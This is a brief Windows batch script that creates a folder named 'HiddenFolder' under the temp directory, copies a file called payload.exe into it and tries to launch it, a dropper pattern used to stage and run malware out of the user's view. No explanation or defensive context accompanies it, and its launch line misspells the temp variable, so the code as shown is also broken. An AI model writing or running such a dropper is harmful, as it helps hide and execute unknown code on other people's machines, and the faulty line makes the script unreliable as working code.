@echo off
mkdir "%TEMP%\HiddenFolder"
copy payload.exe "%TEMP%\HiddenFolder\payload.exe"
start "" "%TEMPT%\HiddenFolder\payload.exe"
exit